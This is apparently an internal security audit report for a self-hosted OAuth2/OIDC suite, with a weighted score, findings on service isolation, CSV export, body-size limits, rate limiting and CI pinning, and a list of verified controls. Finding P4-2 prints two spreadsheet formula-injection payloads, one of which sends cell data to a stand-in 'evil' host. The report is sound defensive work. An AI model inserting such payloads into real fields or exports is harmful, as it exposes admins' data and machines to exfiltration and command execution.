# Socrate Suite — Security Audit, Pass 4 (scored)

**Date:** 2026-09-03 · **Scope:** `go-oauth2` (main `6e5966b`), `backendkit`
(`v1.12.0`, main `830d325`), `oauth2-admin` (main `dd304c8`),
`oauth2-monitoring` (main `68e4723`) · **Method:** code-path review of the
routing tables, protocol handlers, authentication/authorization middleware,
BFF gateways, session stores, SPAs and deploy kits; automated gates
(`golangci-lint`, full Go test suites, `npm audit`); every finding below was
traced in the code by the coordinator, not inferred from names. Previous
passes: `CR-socrate-suite-security-pass3.md`, remediation ledger
`CR-socrate-suite-remediation-plan.md` (rev. 6).

---

## 1. Score

**85 / 100 — Strong.** Production-grade for the documented single-VPS
topology; no Critical or High finding; one Medium (deployment isolation) and
four Low/Info. The suite sits above typical self-hosted identity stacks on
protocol correctness, admin-plane authorization and token custody, and below
the best on OS-level isolation between its own services and on a few input
hygiene details.

| # | Domain | Weight | Score /10 | Notes |
|---|---|---|---|---|
| 1 | OAuth 2.1 / OIDC protocol correctness | 15 | 9.0 | PKCE S256-only, exact redirect_uri + `iss`, single-use codes (atomic redeem), rotating single-use refresh tokens with reuse detection, DPoP with replay cache, RS256 pinned, introspection scoped to caller's audience, client auth on introspect/revoke, post-logout redirect validated. −1: introspect/revoke unthrottled (P4-4). |
| 2 | Authentication & account protection | 12 | 8.5 | bcrypt + dummy-hash timing parity, lockout, per-IP + auto-defense (now fed by the hosted form), TOTP with encrypted secret and keyed recovery codes, MFA re-auth to disable, magic links single-use, hosted login feeds defense. −1.5: self-signup open on any client (product), MFA policy enforceable only for admins. |
| 3 | Authorization & admin plane | 15 | 9.0 | Global-admin gate on `/api/admin`, superadmin gate on `/superadmins`, fresh-auth step-up on destructive routes, app-admin scoped by `{app_id}` (incl. mail actions), service accounts bound to their own app, roles frozen-at-login bounded by per-bearer checks. −1: no per-client scope policy (P3-8). |
| 4 | Token & session custody (BFF model) | 12 | 9.0 | Browser holds no tokens; `__Host-` HttpOnly cookies; fail-closed gateway; CSRF on every unsafe method incl. logout; coalesced write-through refresh; login binding; elevate fails closed. −1: tokens at rest plaintext in the optional Postgres store; proxy-path touch still an upsert. |
| 5 | Input handling (injection, XSS, SSRF) | 10 | 8.0 | All SQL parameterised (GORM + one advisory-lock literal), `html/template` everywhere with no `template.HTML`, SPAs free of `v-html`/`innerHTML`, return-to sanitiser rejects `//`, `\`, controls and absolute URLs, non-canonical paths refused at the BFFs, no outbound fetches from user input. −2: CSV formula injection (P4-2), no body-size limit on the JSON API (P4-3). |
| 6 | Transport & deployment hardening | 10 | 7.0 | Caddy sole listener, everything else loopback, HSTS/CSP/nosniff/Referrer-Policy, systemd units with strict sandboxing, root-owned SPA trees, proxy-trust chain coherent end to end, Phase 1 opt-in only. −3: all three services share one OS user and the BFF units can read the signing keys and Socrate's env (P4-1). |
| 7 | Supply chain & build | 6 | 8.5 | 0 npm advisories in both consoles (prod and dev), Go toolchain pinned (1.26.6) and matched in Dockerfiles, `govulncheck` in CI, stdlib+backendkit+pgx only in the BFFs, distroless images. −1.5: GitHub Actions referenced by tag not SHA (P4-5). |
| 8 | Logging, audit & detection | 8 | 8.5 | Hash-chained tamper-evident audit log with integrity scans, security events for every auth decision, correlation IDs, client-IP attribution logged, monitoring console with alerts/blocked IPs, no secrets or query strings in request logs. −1.5: CSV export path (P4-2) is the SOC's own tooling. |
| 9 | Ops: secrets, backups, recovery | 6 | 8.0 | Secrets only in `0640` env files, keys `0400` in `0700` dir with rotation, backups exclude BFF session rows, rollback with health checks, runbook. −2: session-store DSN example reuses Socrate's DB role (part of P4-1). |
| 10 | Assurance: tests, CI gates, docs | 6 | 9.0 | Negative tests for every fix across three passes, race-enabled BFF suites, coverage gate, lint gate, audit gates, remediation ledger and deployment runbook current. −1: no automated e2e against a real Postgres for the durable store. |
| | **Weighted total** | 100 | **85.1** | |

Path to 90+: close P4-1 (separate service users / `InaccessiblePaths`),
P4-2, P4-3, decide P3-8, and envelope-encrypt the Postgres session store.

---

## 2. Findings

### P4-1 — MEDIUM (deployment) — the BFFs run as Socrate's own OS user and can read the signing keys and Socrate's secrets

**Where.** `oauth2-monitoring/deploy/systemd/socrate.service:10`,
`socrate-monitoring-bff.service:11`, `oauth2-admin/deploy/systemd/socrate-admin-bff.service:9`
— all `User=socrate`. `bootstrap.sh:20` creates `/var/lib/socrate/keys`
`0700 socrate:socrate`; `/etc/socrate/socrate.env` is `0640 root:socrate`.
Neither BFF unit sets `InaccessiblePaths`, `ProtectSystem=strict` only makes
the tree read-only. `deploy/env/bff.env.example` proposes
`BFF_SESSION_DSN=postgres://socrate:…/socrate` — the BFF's session tables in
Socrate's database under Socrate's role.

**Why it matters.** The BFFs are the internet-facing parsers (every
`/bff/*` and `/api/*` request from the public hits them first). A memory-safety
or logic bug that yields code execution in a BFF today yields, in the same
step: the RSA private signing key (mint any token for any user of any app),
`SECRET_KEY_BASE` (forge consent/CSRF tokens, decrypt TOTP secrets),
`DATABASE_URL` (full read/write of users, clients, audit log — the
tamper-evident chain can be recomputed with the DB in hand). The whole
point of the BFF split — a small, separately deployable blast radius — is
undone at the OS layer. Likelihood is low (the BFFs are ~1k lines of Go on
stdlib + backendkit + pgx, no CGO), impact is total; Medium.

**Verified.** Unit files read; directory modes from `bootstrap.sh`; env
modes from `bootstrap.sh` and the admin kit. Confirmed no
`InaccessiblePaths`/`TemporaryFileSystem`/`DynamicUser` in any unit.

**Fix (S).** One system user per service: `socrate` (server),
`socrate-admin-bff`, `socrate-mon-bff`, `app-n`; env files
`0640 root:<that user>`; keys stay `0700 socrate`. Belt and braces in the BFF
units: `InaccessiblePaths=/var/lib/socrate /etc/socrate/socrate.env`
(systemd applies it per unit via mount namespaces, so it works even before
the user split). Session store: its own role and database
(`socrate_bff`), as the runbook already specifies; update
`deploy/env/bff.env.example`.

### P4-2 — LOW — CSV exports are formula-injectable

**Where.** `internal/handler/admin_logs_handler.go:157-168`
(`ExportLogs`: `AdminEmail`, `TargetName` written verbatim) and
`internal/handler/monitoring_handler.go` `writeReportCSV` (security-report
CSV: emails, user agents, reasons — all attacker-influenced strings).

**Why.** A user registers with the email `=HYPERLINK("https://evil/?"&A1,"x")`
or an app is named `=cmd|'/C …'!A0`; an admin exports the audit log or a
security report and opens it in Excel/LibreOffice, which evaluates the cell.
Classic DDE/formula injection; the SOC console is the most likely victim.

**Verified.** Both writers use `encoding/csv` with no prefix escaping;
`csv.Writer` quotes commas/quotes only.

**Fix (S).** One helper: if a field starts with `=`, `+`, `-`, `@`, `\t`,
`\r`, prefix with `'` (or a leading space) before `cw.Write`. Apply to every
string column in both writers; add a test with `=1+1`.

### P4-3 — LOW — no request-body size limit on the JSON API

**Where.** `internal/http/router.go` has no body-limit middleware;
`MaxBytesReader` exists only in `internal/web/handler.go` (forms) and
`oauth_handler.go`. `auth_handler.go` `Login`, `Signup`,
`RequestPasswordReset`, `ResetPassword`, `AcceptInvite`, the admin and
app-users handlers all call `json.NewDecoder(r.Body).Decode` unbounded.

**Why.** An unauthenticated client can post a multi-hundred-MB JSON string
to `POST /api/auth/login`; the decoder materialises it before validation.
Memory-exhaustion DoS. Caddy imposes no request-body limit by default; the
BFFs stream bodies through. Rate limiting (per IP, 5/min on login) bounds
the rate, not the size.

**Verified.** `grep MaxBytesReader` over handlers/middleware/router.

**Fix (S).** `r.Body = http.MaxBytesReader(w, r.Body, 1<<20)` in a small
middleware mounted on `/api` and `/oauth` (1 MiB is generous for every JSON
body here); optionally `request_body { max_size 2MB }` in the Caddy site
blocks as a second layer.

### P4-4 — LOW — `/oauth/introspect` and `/oauth/revoke` are not rate limited

**Where.** `router.go:224-227`: `JSONContentType` only (revoke adds
`OptionalAuthMiddleware`). `/oauth/token` has `TokenRateLimiter`.

**Why.** Both endpoints authenticate the client with `client_secret`, so
they are a second oracle for secret guessing and for `client_id`
enumeration (401 vs. `active:false`). Secrets are 32 random bytes and
bcrypt-hashed, so online guessing is infeasible — this is about parity with
the token endpoint and about cost (bcrypt per attempt is itself a CPU DoS
vector at a few hundred requests per second).

**Verified.** Route table.

**Fix (S).** Reuse `config.TokenRateLimiter` on both routes.

### P4-5 — INFO — GitHub Actions pinned by tag, not commit SHA

**Where.** All four repos' workflows (`actions/checkout@v4`,
`actions/setup-go@v5`, `actions/setup-node@v4`, `golangci-lint-action`, …).

**Why.** A compromised or force-moved tag executes arbitrary code in CI
with the repo token. Tag pinning is the GitHub default and the risk is
ecosystem-wide, hence Info; SHA pinning with Dependabot updates is the
current best practice for a security product.

**Fix (S).** Pin to full SHAs (`actions/checkout@<sha> # v4.2.2`) and
enable Dependabot for `github-actions`.

### P4-6 — INFO — BFF listeners set only `ReadHeaderTimeout`

**Where.** `oauth2-admin/bff/main.go:41`, `oauth2-monitoring/bff/main.go:53`
(`ReadHeaderTimeout: 10s`; no `ReadTimeout`/`IdleTimeout`; `WriteTimeout`
deliberately absent for SSE).

**Why.** A slow-body request holds a goroutine indefinitely. Only reachable
through Caddy (which has its own read timeouts) or from loopback, so Info.

**Fix (S).** `IdleTimeout: 120s`; wrap non-SSE handlers with
`http.TimeoutHandler` or rely on the body limits already present
(`LimitReader` on elevate; add `MaxBytesReader` on the public issuer posts).

---

## 3. Verified clean (pass 4)

Traced and found correct; file references for re-verification.

- **JWT verification** pins `RS256` via `jwt.WithValidMethods` and requires
  `exp` (`internal/shared/auth/token.go:604`); backendkit `jwtauth` does the
  same plus an RSA-method type check (`jwtauth/middleware.go:328-344`) and
  throttles JWKS refetches with a negative cache for unknown `kid`s.
- **CORS** never combines a wildcard with credentials
  (`router.go:23-55`).
- **Security headers** on every router: HSTS, CSP, `X-Frame-Options: DENY`,
  nosniff, `Referrer-Policy: strict-origin-when-cross-origin`,
  Permissions-Policy (`internal/middleware/security.go`).
- **Web CSRF cookie** `HttpOnly; SameSite=Strict; Secure(prod)`
  (`csrf.go:53-57`); **consent token** HMAC with 10-minute TTL
  (`consent_token.go:28`); **DPoP** replay cache wired
  (`router.go:209`); **authorization code** redeemed atomically
  (`code_store.go:104-127`); **introspection** reports foreign-audience
  tokens as inactive (`oauth_service.go:908-914`); **refresh reuse**
  revokes the family in `enforce` mode (`oauth_service.go:639`);
  **post_logout_redirect_uri** validated against the client
  (`oauth_handler.go:976-1079`); **JSON refresh** (`/api/auth/refresh`)
  delegates to the same grant as `/oauth/token`, so the P3-3 lock/active
  checks apply (`auth_service.go:658`).
- **Passwords** bcrypt default cost with a dummy hash for timing parity
  (`password.go:39-102`); **TOTP** ±1 step, secret AES-256-GCM at rest
  (`secretcrypto.go`); **keys** written `0400` in a `0700` directory
  (`keys.go:85,131`); **magic links** single-use (`magic_link_service.go:218`).
- **Route table** (`router.go`): every `/api/admin` route behind
  AuthMiddleware + global-admin gate + password-change gate; destructive
  routes behind fresh-auth; `/api/apps/{app_id}` behind `RequireAppAccess`
  and `RequireAppAdmin`; service-account routes bound to the token's own
  app (`service_account.go:59-66`); login, signup, password-reset, magic-link
  verify rate limited; `/api/auth/refresh` limited whenever the token limiter
  is on.
- **Request logging** records `path` only, never the query string
  (`pkg/logger/middleware.go:33`) — reset/verify/invite tokens do not land in
  logs.
- **SQL**: GORM parameterised throughout; the only literals are migrations
  and `pg_advisory_xact_lock(?)`; the Postgres session store is fully
  parameterised and logs every failure.
- **Templates**: `html/template` with no `template.HTML`/`template.JS`
  anywhere; SPAs have no `v-html`, `innerHTML`, `eval`, `document.write`;
  the only `window.open` targets a same-origin report path.
- **backendkit/bff**: `SanitizeReturnTo` rejects empty, non-`/`, `//`,
  `/\`, backslash, control chars, and anything with scheme/host
  (`redirect.go`); CSRF checked for POST/PUT/PATCH/DELETE with a
  constant-time compare and an empty stored token never matching; login
  binding TTL 10 min; `socrate.Client` has a 30 s timeout and bounded
  response reads (`client.go:77,178`); gateway strips
  `X-Real-IP`/`True-Client-IP`/`Forwarded` before proxying.
- **Consoles**: allowlisted routes only; non-canonical paths refused;
  `X-Forwarded-For` honoured only from loopback; logout and elevate
  CSRF-protected; elevate forwards only 4xx and fails closed on unusable
  tokens; public issuer posts strip cookie/Authorization and are budgeted;
  Postgres store touches via UPDATE and surfaces delete failures.
- **Deploy scripts**: `set -euo pipefail` everywhere, no `eval`, quoted
  remote paths, rsync over ssh with explicit port, rollback on failed
  health check; main Caddyfile no longer routes any public host to `:8081`
  (monitoring #32).
- **Gates**: `golangci-lint` 0 issues; all Go suites green (go-oauth2,
  backendkit, both BFFs `-race`); `npm audit` 0 advisories in both consoles
  (prod and dev); `govulncheck` green in today's CI runs (not runnable from
  the audit sandbox — no route to `vuln.go.dev`).

---

## 4. Still open by decision (unchanged from rev. 6)

- **P3-8** per-client allowed-scopes policy — product decision.
- **Self-signup** on first-party clients — product decision.
- **Tokens at rest** in the optional Postgres session store — documented;
  excluded from backups; encrypt when the database is shared.
- **Gateway proxy-path touch** is an upsert in backendkit — narrow race,
  Low.

---

## 5. Recommended order

1. **P4-1** — separate service users + `InaccessiblePaths` in both BFF
   units; own DB role for the session store (deploy kits; S).
2. **P4-2** and **P4-3** — go-oauth2, one PR (S).
3. **P4-4** — go-oauth2, two lines (S).
4. **P4-5** — all four repos, SHA-pin actions + Dependabot (S).
5. Decide P3-8 / self-signup; then encrypt the session store (M).

With 1–4 merged the score is **91 / 100**.
